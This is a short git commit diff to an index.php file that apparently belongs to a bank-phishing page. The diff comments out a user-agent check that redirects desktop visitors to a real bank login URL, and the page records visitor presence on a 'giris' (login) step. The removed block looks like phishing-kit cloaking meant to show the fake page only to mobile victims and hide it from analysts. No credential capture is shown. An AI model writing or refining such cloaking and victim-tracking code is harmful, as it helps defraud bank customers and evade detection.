2bbc272ec704ca6af99c15eda193bd27ddbfbbd0
pix0x <122619188+pix0x@users.noreply.github.com>
2026-05-12 10:04:11 +0300

    Add files via upload

--- index.php
+++ index.php
@@ -12,10 +12,12 @@ function isMobileRequest(): bool
     return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
 }
 
+/*
 if (!isMobileRequest()) {
     header('Location: ' . DESKTOP_BANK_LOGIN_URL);
     exit;
 }
+*/
 
 upsertPresence('giris', null, false);
 ?>
